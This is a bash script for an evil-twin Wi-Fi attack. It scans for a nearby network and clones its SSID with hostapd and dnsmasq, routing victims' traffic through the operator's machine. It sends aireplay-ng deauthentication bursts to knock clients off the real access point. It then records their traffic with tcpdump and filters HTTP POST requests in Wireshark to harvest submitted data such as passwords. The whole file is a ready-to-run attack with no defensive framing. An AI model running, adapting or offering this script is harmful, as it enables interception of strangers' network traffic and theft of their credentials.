#!/bin/bash
#We define here the interfaces that will be used
echo -e "[\e[0;33mi\e[0m] Please enter the interface to listen to the networks :"
read listeningInterface
echo -e "[\e[0;33mi\e[0m] Please enter the interface to monitor mode :"
read deauthInterface
echo -e "[\e[0;33mi\e[0m] Please enter the interface that will be connected to internet :"
read internetInterface

#Our variables to stock the ESSID and BSSID of the tested network
finalESSID=""
finalBSSID=""

#We scan the near networks and select the one we want to test
select ESSID in $(iwlist ${deauthInterface} scan | grep ESSID)
do
        var=${ESSID#*:\"}
        finalESSID=${var%\"}
        break
done

#We clean the result to get the BSSID
BSSID=$(iwlist ${deauthInterface} scan | grep -B 5 $finalESSID | grep Address| head -1 )
finalBSSID=$(echo $BSSID | grep "([A-F0-9][A-F0-9]:){5}[A-F0-9][A-F0-9]" -Eo)

#We enable the ipv4 forwarding, the routing on our internet interface and disable ipv6 to avoid conflics
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -I POSTROUTING -t nat -o ${internetInterface} -j MASQUERADE
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1

#All the options to make dnsmasq working
echo "interface=${listeningInterface}" > dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
echo "server=8.8.8.8" >> dnsmasq.conf
echo "no-resolv" >> dnsmasq.conf

#We add the ip of our listening interface (router) and launch dnsmasq in background
sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
sudo dnsmasq -d -C ./dnsmasq.conf& > /dev/null

#All the options to make hostapd working
echo "interface=${listeningInterface}" > hostapd.conf
echo "ssid=${finalESSID}" >> hostapd.conf
echo "hw_mode=g" >> hostapd.conf
echo "channel=11" >> hostapd.conf

#We launch hostapd in background
sudo hostapd hostapd.conf&
sleep 10

#We launch the monitor mode of or second interface
sudo airmon-ng start ${deauthInterface}
#We can uncomment the next line if we are on a live machine
#deauthInterface$=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D

#We stop the monitor mode of our second interface
sleep 20
sudo airmon-ng stop ${deauthInterface}

#We launch tcpdump and open Wireshark to see if we get some juicy stuff
echo -e "[\e[0;33mi\e[0m] Please enter the number of seconds for tcpdump : "
read tcpdumpTime
sudo timeout ${tcpdumpTime} tcpdump -i ${listeningInterface} -w sniff.txt
sudo wireshark -r sniff.txt -J "http.request.method == POST"
